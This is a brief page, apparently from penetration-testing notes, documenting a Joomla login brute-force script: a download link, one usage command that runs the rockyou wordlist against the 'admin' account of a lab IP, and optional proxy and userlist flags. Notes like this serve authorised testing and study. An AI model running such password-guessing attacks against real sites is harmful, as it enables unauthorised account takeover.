# joomla-bruteforce

Joomla login bruteforce

{% hint style="info" %}
## Download

[https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
{% endhint %}

## Usage

```bash
python3 joomla-brute.py -u http://10.10.10.150 -w /usr/share/wordlist/rockyou.txt -usr admin
```

Optional parameters:

* `-p` or `--proxy`: http://127.0.0.1:8080
* `-v` or `--verbose`
* `-U` or `--userlist`: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
